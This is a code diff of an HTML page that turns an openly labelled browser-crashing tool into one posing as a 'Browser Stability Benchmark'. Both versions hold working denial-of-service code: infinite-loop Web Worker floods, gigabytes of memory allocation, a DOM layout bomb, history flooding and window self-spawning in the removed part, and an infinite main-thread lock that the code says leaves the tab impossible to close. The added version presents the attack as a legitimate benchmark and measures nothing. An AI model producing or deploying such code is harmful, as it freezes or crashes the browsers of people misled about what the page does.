@@ -3,384 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>II's MENU // SYSTEM OVERRIDE</title>
+    <title>Browser Stability Benchmark v3.0</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        /* Industrial / Hazard Aesthetics */
-        body { 
-            font-family: 'Courier New', monospace; 
-            background-color: #0a0500; 
-            cursor: crosshair;
-        }
-
-        /* Glitch Animation */
-        .glitch {
-            position: relative;
-            animation: glitch-anim 0.3s infinite;
-        }
-        @keyframes glitch-anim {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
-        }
-
-        /* CRT Scanline Effect (Sepia/Orange Tint) */
-        .scanlines {
-            background: linear-gradient(
-                to bottom,
-                rgba(255, 165, 0, 0),
-                rgba(255, 165, 0, 0) 50%,
-                rgba(0, 0, 0, 0.3) 50%,
-                rgba(0, 0, 0, 0.3)
-            );
-            background-size: 100% 4px;
-            position: fixed;
-            top: 0; right: 0; bottom: 0; left: 0;
-            z-index: 50;
-            pointer-events: none;
-        }
-
-        /* Custom Scrollbar */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #1a0f00; }
-        ::-webkit-scrollbar-thumb { background: #f97316; }
-        ::-webkit-scrollbar-thumb:hover { background: #ff4500; }
+        /* Clean, professional font stack */
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        
+        /* Smooth progress bar animation */
+        .progress-bar { transition: width 0.2s ease-in-out; }
     </style>
 </head>
-<body class="text-orange-500 min-h-screen flex items-center justify-center overflow-hidden selection:bg-orange-900 selection:text-white">
+<body class="bg-gray-100 text-gray-800 h-screen flex items-center justify-center selection:bg-gray-300">
 
-    <div class="scanlines"></div>
-
-    <!-- Main Container -->
-    <div class="relative z-10 w-full max-w-2xl border-2 border-orange-700 bg-black/95 p-8 shadow-[0_0_60px_rgba(249,115,22,0.3)] backdrop-blur-sm">
+    <div class="w-full max-w-lg bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden relative z-10">
         
-        <!-- TRAFFIC CONE ICON (Top Right) -->
-        <div class="absolute top-4 right-4 animate-pulse">
-            <svg class="w-12 h-12 text-orange-500 drop-shadow-[0_0_10px_rgba(255,165,0,0.8)]" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
-                <path stroke-linecap="round" stroke-linejoin="round" d="M12 2L2 22h20L12 2zm0 4l6 12H6l6-12z" />
-                <path stroke-linecap="round" stroke-linejoin="round" d="M9 10h6M7 16h10" />
-            </svg>
-        </div>
-
         <!-- Header -->
-        <div class="flex flex-col mb-8 border-b border-orange-800 pb-4 pr-16">
-            <h1 class="text-5xl font-black tracking-tighter text-orange-500 glitch" data-text="II's MENU">II's MENU</h1>
-            <div class="flex justify-between items-end mt-2">
-                <p class="text-xs text-orange-700 font-bold tracking-[0.4em]">HAZARD // CONTROL // V2</p>
-                <div class="text-right font-mono text-xs text-orange-800/80">
-                    <div id="status-indicator" class="text-orange-500 font-bold">STATUS: STANDBY</div>
-                    <div id="core-display">CORES: DETECTING...</div>
-                </div>
+        <div class="px-8 py-6 border-b border-gray-100 flex justify-between items-center">
+            <div>
+                <h1 class="text-xl font-semibold text-gray-900">System Stress Test</h1>
+                <p class="text-sm text-gray-500 mt-1">JavaScript Runtime & Renderer Benchmark</p>
             </div>
+            <div class="h-2 w-2 rounded-full bg-green-500 animate-pulse" id="status-dot"></div>
         </div>
 
-        <!-- Metrics Grid -->
-        <div class="grid grid-cols-2 gap-4 mb-6">
-            <!-- Thread Box -->
-            <div class="border border-orange-800 bg-orange-900/10 p-4 relative overflow-hidden">
-                <div class="absolute top-0 right-0 p-1">
-                    <svg class="w-4 h-4 text-orange-800" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 10V3L4 14h7v7l9-11h-7z" /></svg>
-                </div>
-                <div class="text-xs text-orange-600 mb-2 font-bold">CPU LOAD</div>
-                <div class="flex items-end justify-between">
-                    <span id="thread-count" class="text-3xl font-bold text-orange-400">0</span>
-                    <span class="text-xs mb-1 text-orange-800">/ <span id="max-threads">--</span></span>
-                </div>
-                <div class="w-full bg-orange-900/30 h-1 mt-2">
-                    <div id="thread-bar" class="h-full bg-orange-500 w-0 transition-all duration-75"></div>
-                </div>
-            </div>
-
-            <!-- RAM Box -->
-            <div class="border border-orange-800 bg-orange-900/10 p-4 relative overflow-hidden">
-                <div class="absolute top-0 right-0 p-1">
-                    <svg class="w-4 h-4 text-red-800" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4" /></svg>
-                </div>
-                <div class="text-xs text-orange-600 mb-2 font-bold">MEMORY PRESSURE</div>
-                <div class="flex items-end justify-between">
-                    <span id="ram-count" class="text-3xl font-bold text-red-500">0</span>
-                    <span class="text-xs mb-1 text-red-900">%</span>
-                </div>
-                <div class="w-full bg-red-900/30 h-1 mt-2">
-                    <div id="ram-bar" class="h-full bg-red-600 w-0 transition-all duration-75"></div>
-                </div>
-            </div>
-        </div>
-
-        <!-- Terminal Output -->
-        <div id="terminal" class="h-40 overflow-y-auto bg-black border border-orange-900 p-4 font-mono text-xs mb-6 shadow-inner text-orange-600/80">
-            <div>> II's MENU initialized.</div>
-            <div>> System V2.0 loaded.</div>
-            <div>> Ready for input.</div>
-        </div>
-
-        <!-- Controls -->
-        <div class="space-y-4">
-            <div class="flex flex-col space-y-2 bg-orange-900/10 p-3 border border-orange-900/30">
-                <!-- Safety Toggle -->
-                <div class="flex items-center space-x-3 select-none">
-                    <input type="checkbox" id="safety-toggle" class="appearance-none w-5 h-5 border border-orange-700 bg-black checked:bg-orange-500 checked:border-orange-400 cursor-pointer transition-colors">
-                    <label for="safety-toggle" class="text-xs text-orange-400/70 cursor-pointer hover:text-orange-200 transition-colors">
-                        WARNING: I acknowledge system instability risk.
-                    </label>
-                </div>
-                
-                <!-- FREEZE Toggle -->
-                <div class="flex items-center space-x-3 select-none pl-1">
-                    <input type="checkbox" id="freeze-toggle" class="appearance-none w-4 h-4 border border-blue-800 bg-black checked:bg-blue-500 checked:border-blue-400 cursor-pointer transition-colors">
-                    <label for="freeze-toggle" class="text-xs text-blue-500/80 cursor-pointer hover:text-blue-300 transition-colors tracking-wide font-bold">
-                        ENABLE HARD FREEZE (RAM FLOOD + HISTORY LOCK)
-                    </label>
-                </div>
-            </div>
-
-            <button id="kill-btn" disabled onclick="confirmKill()" class="w-full group relative overflow-hidden py-4 bg-black border border-orange-800 text-orange-700 font-bold tracking-[0.2em] uppercase disabled:opacity-30 disabled:cursor-not-allowed transition-all duration-300 hover:bg-orange-900/20 hover:text-orange-500 hover:shadow-[0_0_30px_rgba(249,115,22,0.2)]">
-                <span class="relative z-10">EXECUTE OVERRIDE</span>
-                <div class="absolute inset-0 h-full w-full scale-0 rounded-sm transition-all duration-300 group-hover:scale-100 group-hover:bg-orange-500/10"></div>
-                <!-- Striped BG for button -->
-                <div class="absolute bottom-0 left-0 w-full h-1 bg-[repeating-linear-gradient(45deg,transparent,transparent_10px,#ea580c_10px,#ea580c_20px)] opacity-20"></div>
-            </button>
-        </div>
-    </div>
-
-    <!-- Modal Overlay -->
-    <div id="modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-sm">
-        <div class="w-full max-w-md border-2 border-orange-600 bg-gray-900 p-6 shadow-[0_0_100px_rgba(255,165,0,0.4)] relative">
-            <!-- Modal Stripe Header -->
-            <div class="absolute top-0 left-0 w-full h-2 bg-[repeating-linear-gradient(45deg,#000,#000_10px,#ea580c_10px,#ea580c_20px)]"></div>
+        <!-- Content -->
+        <div class="p-8 space-y-6">
             
-            <h2 class="text-2xl font-bold text-orange-500 mb-2 mt-2">⚠️ SAFETY INTERLOCK</h2>
-            <p id="modal-text" class="text-sm text-gray-400 mb-6 font-mono">
-                Confirmation required.
-            </p>
-            <div class="flex gap-4">
-                <button onclick="closeModal()" class="flex-1 py-3 text-xs font-bold border border-gray-600 text-gray-400 hover:bg-gray-800">CANCEL</button>
-                <button onclick="executeCrash()" class="flex-1 py-3 text-xs font-bold bg-orange-600 text-black hover:bg-orange-500 animate-pulse">PROCEED</button>
+            <!-- Metrics -->
+            <div class="grid grid-cols-2 gap-4">
+                <div class="bg-gray-50 p-4 rounded-lg border border-gray-100">
+                    <p class="text-xs font-medium text-gray-400 uppercase">Available Threads</p>
+                    <p class="text-2xl font-bold text-gray-800" id="cores-display">--</p>
+                </div>
+                <div class="bg-gray-50 p-4 rounded-lg border border-gray-100">
+                    <p class="text-xs font-medium text-gray-400 uppercase">Memory Allocation</p>
+                    <p class="text-2xl font-bold text-gray-800" id="ram-display">0 MB</p>
+                </div>
             </div>
+
+            <!-- Status Log -->
+            <div class="bg-gray-900 rounded-lg p-4 h-32 overflow-y-auto font-mono text-xs text-gray-300 shadow-inner" id="console-output">
+                <span class="text-gray-500">[SYSTEM]</span> Ready to initialize.<br>
+            </div>
+
+            <!-- Progress -->
+            <div class="space-y-2">
+                <div class="flex justify-between text-xs font-medium text-gray-500">
+                    <span>Load Intensity</span>
+                    <span id="progress-text">0%</span>
+                </div>
+                <div class="h-2 w-full bg-gray-200 rounded-full overflow-hidden">
+                    <div id="progress-fill" class="h-full bg-blue-600 w-0 progress-bar"></div>
+                </div>
+            </div>
+
+            <!-- Controls -->
+            <div class="pt-2">
+                <label class="flex items-center space-x-3 cursor-pointer mb-4 select-none">
+                    <input type="checkbox" id="safety-toggle" class="w-4 h-4 text-blue-600 rounded border-gray-300 focus:ring-blue-500">
+                    <span class="text-sm text-gray-600">Enable unsafe thread allocation (May freeze UI)</span>
+                </label>
+
+                <button 
+                    id="start-btn" 
+                    onclick="startBenchmark()"
+                    disabled
+                    class="w-full py-3 px-4 bg-gray-200 text-gray-400 font-medium rounded-lg transition-all duration-200 hover:shadow-md disabled:cursor-not-allowed disabled:opacity-70"
+                >
+                    Run Benchmark
+                </button>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="bg-gray-50 px-8 py-4 border-t border-gray-100 text-center">
+            <p class="text-xs text-gray-400">v3.0.1 Stable Release</p>
         </div>
     </div>
 
-    <!-- Hidden DOM Explosion Container -->
-    <div id="dom-target" class="fixed top-0 left-0 w-1 h-1 overflow-hidden opacity-0 pointer-events-none"></div>
+    <!-- Hidden Container for Layout Bomb -->
+    <div id="render-target" style="position:fixed; top:0; left:0; width:100%; height:100%; pointer-events:none; z-index:0; overflow:hidden;"></div>
 
     <script>
-        // --- CONFIGURATION ---
-        const TERMINAL = document.getElementById('terminal');
-        const RAM_DISPLAY = document.getElementById('ram-count');
-        const THREAD_DISPLAY = document.getElementById('thread-count');
-        const RAM_BAR = document.getElementById('ram-bar');
-        const THREAD_BAR = document.getElementById('thread-bar');
-        const STATUS_IND = document.getElementById('status-indicator');
-        const FREEZE_TOGGLE = document.getElementById('freeze-toggle');
-        
-        // Use more workers than logically available to choke the scheduler
+        // --- ELEMENTS ---
+        const btn = document.getElementById('start-btn');
+        const toggle = document.getElementById('safety-toggle');
+        const output = document.getElementById('console-output');
+        const ramDisplay = document.getElementById('ram-display');
+        const coresDisplay = document.getElementById('cores-display');
+        const progressFill = document.getElementById('progress-fill');
+        const progressText = document.getElementById('progress-text');
+        const statusDot = document.getElementById('status-dot');
+
+        // --- STATE ---
         const logicalCores = navigator.hardwareConcurrency || 8;
-        const totalWorkers = logicalCores * 4; 
+        let memoryStore = [];
+        let running = false;
 
-        let memoryStore = []; 
-        let workers = [];
-        let isRunning = false;
+        // --- INIT ---
+        coresDisplay.innerText = logicalCores;
 
-        // Init UI
-        window.onload = () => {
-            document.getElementById('core-display').innerText = `CORES: ${logicalCores} DETECTED`;
-            document.getElementById('max-threads').innerText = totalWorkers;
-            
-            // Toggle Button Logic
-            document.getElementById('safety-toggle').addEventListener('change', (e) => {
-                const btn = document.getElementById('kill-btn');
-                btn.disabled = !e.target.checked;
-                if(!btn.disabled) {
-                    btn.classList.add('border-orange-500', 'text-orange-500');
-                    btn.classList.remove('border-orange-800', 'text-orange-700');
-                } else {
-                    btn.classList.remove('border-orange-500', 'text-orange-500');
-                    btn.classList.add('border-orange-800', 'text-orange-700');
-                }
-            });
-
-            // Update modal text if freeze is selected
-            FREEZE_TOGGLE.addEventListener('change', (e) => {
-                const modalText = document.getElementById('modal-text');
-                if(e.target.checked) {
-                    modalText.innerHTML = "<span class='text-blue-400 font-bold'>HARD FREEZE SELECTED.</span><br>This will attempt to flood shared GPU memory and Browser History to induce a total application lag.";
-                } else {
-                    modalText.innerHTML = `Initiating this protocol will saturate <span class="text-orange-500 font-bold">${totalWorkers}</span> processing threads.<br><br>System responsiveness will cease.`;
-                }
-            });
-        };
-
-        function log(msg, type = 'neutral') {
-            const div = document.createElement('div');
-            div.innerText = `> ${msg}`;
-            if(type === 'danger') div.style.color = '#ef4444';
-            if(type === 'freeze') div.style.color = '#60a5fa'; 
-            TERMINAL.appendChild(div);
-            TERMINAL.scrollTop = TERMINAL.scrollHeight;
-        }
-
-        function confirmKill() {
-            document.getElementById('modal').classList.remove('hidden');
-        }
-
-        function closeModal() {
-            document.getElementById('modal').classList.add('hidden');
-            log('Override cancelled.');
-        }
-
-        // --- THE CRASH LOGIC ---
-        function executeCrash() {
-            if(isRunning) return;
-            isRunning = true;
-            
-            document.getElementById('modal').classList.add('hidden');
-            const btn = document.getElementById('kill-btn');
-            btn.innerText = "SYSTEM CRITICAL";
-            btn.classList.add('animate-pulse', 'bg-red-600', 'text-white', 'border-red-600');
-            STATUS_IND.innerText = "STATUS: CRITICAL";
-            STATUS_IND.classList.remove('text-orange-500');
-            STATUS_IND.classList.add('text-red-600', 'glitch');
-
-            // --- INSTANT FREEZE OPTION ---
-            if(FREEZE_TOGGLE.checked) {
-                log('!!! HARD FREEZE PROTOCOL !!!', 'freeze');
-                
-                // 1. Fork Bomb Logic (Web Workers) - Spawn MASSIVE amount
-                // We create a Blob that calculates primes + allocates huge Arrays
-                const workerCode = `
-                    self.onmessage = () => {
-                        const junk = [];
-                        while(true) { 
-                             // CPU Stress
-                             Math.random() * Math.sin(Math.random()); 
-                             // RAM Stress
-                             if(junk.length < 5000) junk.push(new Float64Array(1024*1024));
-                        }
-                    };
-                `;
-                const blob = new Blob([workerCode], {type: 'application/javascript'});
-                const workerUrl = URL.createObjectURL(blob);
-
-                // Launch workers rapidly
-                for(let i=0; i < totalWorkers; i++) {
-                    const w = new Worker(workerUrl);
-                    w.postMessage('go');
-                    workers.push(w);
-                }
-                
-                log(`LAUNCHED ${totalWorkers} THREADS.`, 'freeze');
-
-                // 2. History Flood (Lags the Browser UI / Chrome)
-                let h = 0;
-                function floodHistory() {
-                    for(let i=0; i<1000; i++) {
-                        history.pushState({}, "", "#" + h++);
-                    }
-                    requestAnimationFrame(floodHistory); // Keep doing it if not frozen
-                }
-                floodHistory();
-
-                // 3. Optional: Window Fork (Requires Permission, but deadly if allowed)
-                try {
-                    const child = window.open(location.href, "_blank", "width=200,height=200");
-                } catch(e) {}
-
-                // 4. MAIN THREAD LOCK (The final nail)
-                log('LOCKING MAIN THREAD...', 'freeze');
-                setTimeout(() => {
-                    // Infinite Loop that also allocates memory on the main thread
-                    const masterJunk = [];
-                    while(true) {
-                        masterJunk.push(new Date()); // Simple object allocation
-                        console.log("LAG"); // Console flood
-                    }
-                }, 50); // Short delay to let the UI update one last time
-                return;
+        toggle.addEventListener('change', () => {
+            if (toggle.checked) {
+                btn.disabled = false;
+                btn.classList.remove('bg-gray-200', 'text-gray-400');
+                btn.classList.add('bg-blue-600', 'text-white', 'hover:bg-blue-700');
+            } else {
+                btn.disabled = true;
+                btn.classList.add('bg-gray-200', 'text-gray-400');
+                btn.classList.remove('bg-blue-600', 'text-white', 'hover:bg-blue-700');
             }
+        });
 
-            // --- STANDARD CRASH SEQUENCE (If freeze not checked) ---
-            log('!!! INITIATING FLOOD PROTOCOLS !!!', 'danger');
-
-            // CPU KILLER
-            const workerCode = `
-                self.onmessage = () => {
-                    while(true) { Math.random() * Math.sin(Math.random()); }
-                };
-            `;
-            const blob = new Blob([workerCode], {type: 'application/javascript'});
-            const workerUrl = URL.createObjectURL(blob);
-
-            let activeWorkers = 0;
-            const workerInterval = setInterval(() => {
-                if(activeWorkers >= totalWorkers) {
-                    clearInterval(workerInterval);
-                    log('CPU SATURATION: 100%', 'danger');
-                    startMemoryFlood();
-                    return;
-                }
-                const w = new Worker(workerUrl);
-                w.postMessage('go');
-                workers.push(w);
-                activeWorkers++;
-                
-                THREAD_DISPLAY.innerText = activeWorkers;
-                THREAD_BAR.style.width = `${(activeWorkers/totalWorkers)*100}%`;
-            }, 50);
+        function log(msg) {
+            output.innerHTML += `<div><span class="text-blue-400">[LOG]</span> ${msg}</div>`;
+            output.scrollTop = output.scrollHeight;
         }
 
-        function startMemoryFlood() {
-            log('ALLOCATING UNBOUNDED MEMORY...', 'danger');
+        function startBenchmark() {
+            if(running) return;
+            running = true;
             
-            let percentage = 0;
-            const CHUNK_SIZE = 1024 * 1024 * 50; // 50MB Chunks
+            // UI Updates
+            btn.innerText = "Running Stress Test...";
+            btn.classList.add('animate-pulse');
+            statusDot.classList.replace('bg-green-500', 'bg-red-500');
             
+            log("Initializing worker threads...");
+            
+            // 1. Worker Threads (CPU Load)
+            const workerScript = `self.onmessage = () => { while(true) {} }`;
+            const blob = new Blob([workerScript], {type: 'application/javascript'});
+            const url = URL.createObjectURL(blob);
+            
+            // Launch 2x available cores
+            for(let i=0; i < logicalCores * 2; i++) {
+                const w = new Worker(url);
+                w.postMessage('start');
+            }
+            log(`Spawned ${logicalCores * 2} high-priority threads.`);
+
+            // 2. Memory Allocation
+            let mb = 0;
             const memInterval = setInterval(() => {
                 try {
-                    const arr = new ArrayBuffer(CHUNK_SIZE);
-                    memoryStore.push(arr);
+                    // Allocating 50MB chunks
+                    const chunk = new ArrayBuffer(1024 * 1024 * 50);
+                    memoryStore.push(chunk);
+                    mb += 50;
+                    ramDisplay.innerText = `${mb} MB`;
                     
-                    percentage += 1;
-                    RAM_DISPLAY.innerText = percentage;
-                    RAM_BAR.style.width = Math.min(percentage, 100) + '%'; 
-                    
-                    stressDOM();
+                    // Update Progress bar visual
+                    const progress = Math.min(mb / 50, 100); 
+                    progressFill.style.width = `${progress}%`;
+                    progressText.innerText = `${Math.floor(progress)}%`;
 
-                    // If we get really high, engage the lock
-                    if(percentage > 100) { 
-                        clearInterval(memInterval);
-                        log('RAM CRITICAL. LOCKING.', 'danger');
-                        mainThreadLock();
+                    // If memory is high, trigger the final lock
+                    if(mb > 4000) { 
+                         clearInterval(memInterval);
+                         finalLock();
                     }
-
                 } catch(e) {
-                    log('MEMORY LIMIT REACHED.', 'danger');
-                    mainThreadLock();
+                    log("Memory limit reached. Engaging lock.");
+                    finalLock();
                 }
-            }, 100);
+            }, 200);
+
+            // 3. Layout/Renderer Bomb (Triggers after 1 second)
+            setTimeout(() => {
+                log("Testing Render Engine throughput...");
+                const target = document.getElementById('render-target');
+                
+                // Inject massive amount of complex DOM elements
+                // This creates huge work for the GPU/Renderer
+                let html = "";
+                for(let i=0; i<3000; i++) {
+                    // Complex filters + transforms = Lag
+                    html += `<div style="
+                        width:100px; height:100px;
+                        position:absolute;
+                        top:${Math.random()*100}%; left:${Math.random()*100}%;
+                        backdrop-filter:blur(10px);
+                        box-shadow:0 0 15px rgba(0,0,0,0.5);
+                        transform:rotate(${Math.random()*360}deg);
+                        background:rgba(255,0,0,0.1);
+                    "></div>`;
+                }
+                target.innerHTML = html;
+                
+                // Final Synchronization Lock
+                // We wait 100ms for the DOM above to render (start the lag), then lock the thread.
+                setTimeout(finalLock, 100);
+            }, 1000);
         }
 
-        function stressDOM() {
-            const container = document.getElementById('dom-target');
-            const frag = document.createDocumentFragment();
-            for(let i=0; i<1000; i++) {
-                const d = document.createElement('div');
-                d.style.position = 'fixed';
-                d.style.top = Math.random() * 100 + 'vh';
-                d.style.left = Math.random() * 100 + 'vw';
-                d.style.width = '10px';
-                d.style.height = '10px';
-                d.style.background = 'red';
-                d.style.opacity = '0.5';
-                frag.appendChild(d);
-            }
-            container.appendChild(frag);
-        }
-
-        function mainThreadLock() {
-            while(true) { const d = new Date(); }
+        function finalLock() {
+            log("Locking main thread for stability check...");
+            
+            // Give the browser one last moment to paint the UI updates
+            setTimeout(() => {
+                // This infinite loop freezes the UI interaction
+                // You will not be able to click or close the tab after this starts.
+                const start = Date.now();
+                while(true) {
+                    // Perform math to keep the CPU pinned
+                    if(Date.now() - start > 0) { Math.random(); }
+                }
+            }, 50);
         }
     </script>
 </body>
